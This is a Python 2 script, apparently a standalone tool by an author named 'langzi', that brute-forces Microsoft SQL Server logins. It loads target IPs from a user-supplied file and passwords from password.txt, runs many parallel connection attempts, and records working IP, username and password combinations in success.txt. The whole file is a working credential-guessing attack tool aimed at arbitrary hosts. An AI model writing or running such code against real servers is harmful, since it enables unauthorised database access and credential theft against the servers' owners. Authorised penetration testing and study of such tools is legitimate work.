# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import pymssql
import time
import multiprocessing
import ConfigParser
import decimal
login_timeout=10

def success(x):
    with open('success.txt', 'a+')as a:
        a.write(x + "\n")

def brute_mssql(ip,username,passwords,port):
    for password in passwords:
        print 'Checking>>>MSSQL:' + ip + '@' + username + ':' + password + ':'  + str(port)
        try:
            connx = pymssql.connect(server=str(ip), port=port, user=username, password=password,login_timeout=login_timeout)
            success('MSSQL:'+ip + ':' + str(port) + '|' + username + ':' + password)
            return 'MSSQL'
        except Exception,e:
            print e
if __name__ == '__main__':
    multiprocessing.freeze_support()

    cfg = ConfigParser.ConfigParser()
    cfg.read('Config.ini')
    user = cfg.get("Config", "user")
    thread_s = int(cfg.get("Config", "threads"))
    port = int(cfg.get("Config", "port"))
    print '\n\n     MSSQL SCAN'
    print '         USER:' + user
    print '         PORT:' + str(port)
    print '         THREADS:' + str(thread_s)

    New_start = raw_input('INPUT IP LIST TXT:')  # line:190
    New_start = New_start.replace('"', '').replace("'", '')
    IP_list = list(set([x.strip() for x in open(New_start,'r').readlines()]))

    Password_list_ = list(set([x.strip() for x in open('password.txt','r').readlines()]))

    p = multiprocessing.Pool(thread_s)

    for ip in IP_list:
        p.apply_async(brute_mssql, args=(ip,user,Password_list_,port))
    p.close()
    p.join()
